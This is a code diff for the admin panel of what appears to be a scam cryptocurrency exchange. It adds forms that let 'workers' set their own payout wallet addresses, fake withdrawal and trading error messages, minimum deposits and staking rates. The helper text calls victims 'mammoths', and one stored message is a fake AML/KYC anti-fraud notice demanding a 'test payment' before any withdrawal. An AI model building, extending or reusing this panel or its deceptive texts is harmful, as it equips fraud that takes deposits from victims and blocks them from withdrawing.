@@ -110,17 +110,17 @@ $user_info = get_user_info($auth_token);
                                     Все выплаты будут осуществляться только на те адреса, которые указаны здесь.</p>
                                 <div class="input_hint">
                                     <div>BITCOIN:</div>
-                                    <input type="text" placeholder="bc1...">
+                                    <input name="address1" type="text" placeholder="bc1...">
 
                                 </div>
                                 <div class="input_hint">
                                     <div>LITECOIN:</div>
-                                    <input type="text" placeholder="ltc2...">
+                                    <input name="address2" type="text" placeholder="ltc2...">
 
                                 </div>
                                 <div class="input_hint">
-                                    <div>USDT (TRC20)::</div>
-                                    <input type="text" placeholder="tbf5...">
+                                    <div>USDT (TRC20):</div>
+                                    <input name="address3" type="text" placeholder="tbf5...">
                                 </div>
 
                                 <div style="display: flex; align-items: center;">
@@ -143,12 +143,12 @@ $user_info = get_user_info($auth_token);
 
                                 <div class="input_hint">
 
-                                    <input type="text" name="withdraw_error" placeholder="100" class="main_input" id="">
+                                    <input type="text" id="withdraw_error" name="withdraw_error" placeholder="100" class="main_input" id="">
 
                                 </div>
                                 <div style="display: flex; align-items: center;">
 
-                                    <button class="main_btn" type="submit">Save changes</button>
+
                                 </div>
                             </div>
                             <div class="content_card_header" style="width: fit-content; border-bottom: none; margin-bottom: 5px">
@@ -161,7 +161,7 @@ $user_info = get_user_info($auth_token);
                                 <p class="inpt_helper">Минимальная сумма для вывода всех валют</p>
                                 <div class="input_hint">
                                     <div>Amount ($)</div>
-                                    <input type="text" placeholder="100">
+                                    <input type="text" oninput="validateInput_numbers(this)" id="minLimit" value="0" name="minLimit" placeholder="100">
 
                                 </div>
                                 <div style="display: flex; align-items: center;">
@@ -190,20 +190,20 @@ $user_info = get_user_info($auth_token);
                                         <p class="inpt_helper" style="margin-bottom: 10px">
                                             Ошибка, которая отобразится при попытке юзером начать торговлю (открыть Buy/Sell Order) на странице Trading
                                         </p>
-                                        <textarea style="resize: none; width: 100%;height: 150px;  max-width: 450px"  placeholder="You must have a minimum balance to make trades on the trading page." class="main_input"></textarea>
+                                        <textarea style="resize: none; width: 100%;height: 150px;  max-width: 450px"  name="trading_error" placeholder="You must have a minimum balance to make trades on the trading page." class="main_input"></textarea>
                                     </div>
                                     <div style="max-width: 450px">
                                         <h3 style="margin-bottom: 20px">
-                                            Trading error
+                                            Verification Page Error
                                         </h3>
                                         <p class="inpt_helper" style="margin-bottom: 10px">
                                             Текст, который отобразится мамонтам на странице верификации (если оставить пустым, то отобразится дефолтный текст)
                                         </p>
-                                        <textarea style="resize: none; height: 150px;  width: 450px" placeholder="Suspicious activity has been detected in your account by our automated anti-fraud system. To proceed with the withdrawal operation, you must complete the identification process for your account in accordance with our service terms and AML/KYC policy.To complete this process, you must make a test payment in any currency from the provided list. Once verified, the funds will be credited to your account balance and made available for withdrawal." class="main_input"></textarea>
+                                        <textarea style="resize: none; height: 150px;  width: 450px" name="verif_error" placeholder="Suspicious activity has been detected in your account by our automated anti-fraud system. To proceed with the withdrawal operation, you must complete the identification process for your account in accordance with our service terms and AML/KYC policy.To complete this process, you must make a test payment in any currency from the provided list. Once verified, the funds will be credited to your account balance and made available for withdrawal." class="main_input"></textarea>
                                     </div>
 
                                 </div>
-                                <button class="main_btn" type="submit">Add promo</button>
+                                <button class="main_btn" type="submit">Save changes</button>
                             </div>
 
 
@@ -233,12 +233,12 @@ $user_info = get_user_info($auth_token);
                                 </div>
                                 <div class="input_hint">
                                     <div>1 month:</div>
-                                    <input type="text" name="3week" placeholder="2.1">
+                                    <input type="text" name="1mouth" placeholder="2.1">
                                     <div>%</div>
                                 </div>
                                 <div class="input_hint">
                                     <div>3 month:</div>
-                                    <input type="text" name="3week" placeholder="2.6">
+                                    <input type="text" name="3month" placeholder="2.6">
                                     <div>%</div>
                                 </div>
 
@@ -337,6 +337,7 @@ $user_info = get_user_info($auth_token);
 
     </main>
 </body>
+<script src="/assets/scripts/main.js"></script>
 <script>
     const telegram_binding_form = document.getElementById("telegram_binding_form");
     telegram_binding_form.addEventListener("submit", function(e) {
@@ -369,5 +370,179 @@ $user_info = get_user_info($auth_token);
             }
         });
     });
+
+    const paymentAddress_binding_form = document.getElementById("paymentAddress_binding_form");
+    paymentAddress_binding_form.addEventListener("submit", function(e) {
+        e.preventDefault();
+        const formData = new FormData(paymentAddress_binding_form);
+        $.ajax({
+            url: "/api/ajax/binding_paymentAddress_worker.php",
+            type: "POST",
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(data) {
+                if (data.status === "success") {
+                    new Notify({
+                        title: "Success",
+                        text: "Payment addresses successfully added",
+                        status: "success",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                } else {
+                    new Notify({
+                        title: "Error",
+                        text: "Payment addresses not added",
+                        status: "error",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                }
+            }
+        });
+    });
+
+    const withdraw_binding_form = document.getElementById("withdraw_binding_form");
+    withdraw_binding_form.addEventListener("submit", function(e) {
+        const minLimit = document.getElementById("minLimit");
+        const withdraw_error = document.getElementById("withdraw_error");
+
+        if (minLimit.value === "" || withdraw_error.value === "") {
+            new Notify({
+                title: "Error",
+                text: "Заполните все поля",
+                status: "error",
+                autoclose: true,
+                autotimeout: 3000
+            });
+            e.preventDefault();
+            return;
+        }
+        e.preventDefault();
+        const formData = new FormData(withdraw_binding_form);
+        $.ajax({
+            url: "/api/ajax/binding_withdraw_worker.php",
+            type: "POST",
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(data) {
+                if (data.status === "success") {
+                    new Notify({
+                        title: "Success",
+                        text: "Withdraw error successfully added",
+                        status: "success",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                } else {
+                    new Notify({
+                        title: "Error",
+                        text: "Withdraw error not added",
+                        status: "error",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                }
+            }
+        });
+    });
+    const textsError_binding_form = document.getElementById("textsError_binding_form");
+    textsError_binding_form.addEventListener("submit", function(e) {
+        e.preventDefault();
+        const formData = new FormData(textsError_binding_form);
+        $.ajax({
+            url: "/api/ajax/binding_textsError_worker.php",
+            type: "POST",
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(data) {
+                if (data.status === "success") {
+                    new Notify({
+                        title: "Success",
+                        text: "Texts error successfully added",
+                        status: "success",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                } else {
+                    new Notify({
+                        title: "Error",
+                        text: "Texts error not added",
+                        status: "error",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                }
+            }
+        });
+    });
+
+    const stakingProcent_binding_form = document.getElementById("stakingProcent_binding_form");
+    stakingProcent_binding_form.addEventListener("submit", function(e) {
+        e.preventDefault();
+        const formData = new FormData(stakingProcent_binding_form);
+        $.ajax({
+            url: "/api/ajax/binding_stakingProcent_worker.php",
+            type: "POST",
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(data) {
+                if (data.status === "success") {
+                    new Notify({
+                        title: "Success",
+                        text: "Staking percents successfully added",
+                        status: "success",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                } else {
+                    new Notify({
+                        title: "Error",
+                        text: "Staking percents not added",
+                        status: "error",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                }
+            }
+        });
+    });
+    const minimalDeposit_binding_form = document.getElementById("minimalDeposit_binding_form");
+    minimalDeposit_binding_form.addEventListener("submit", function(e) {
+        e.preventDefault();
+        const formData = new FormData(minimalDeposit_binding_form);
+        $.ajax({
+            url: "/api/ajax/binding_minimalDeposit_worker.php",
+            type: "POST",
+            data: formData,
+            processData: false,
+            contentType: false,
+            success: function(data) {
+                if (data.status === "success") {
+                    new Notify({
+                        title: "Success",
+                        text: "Minimal deposit amount successfully added",
+                        status: "success",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                } else {
+                    new Notify({
+                        title: "Error",
+                        text: "Minimal deposit amount not added",
+                        status: "error",
+                        autoclose: true,
+                        autotimeout: 3000
+                    });
+                }
+            }
+        });
+    });
 </script>
+
+
 </html>
